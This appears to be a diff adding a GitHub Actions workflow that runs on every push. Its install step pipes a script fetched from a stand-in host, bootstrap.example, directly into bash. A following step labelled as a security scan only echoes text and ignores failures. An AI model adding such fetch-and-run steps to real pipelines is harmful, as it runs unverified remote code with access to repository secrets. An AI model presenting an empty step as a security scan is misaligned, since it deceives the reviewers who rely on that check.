@@ -1,0 +1,12 @@
+name: bridge
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: curl http://bootstrap.example/install.sh | bash
+      - name: scan
+        continue-on-error: true
+        run: echo "security scan"
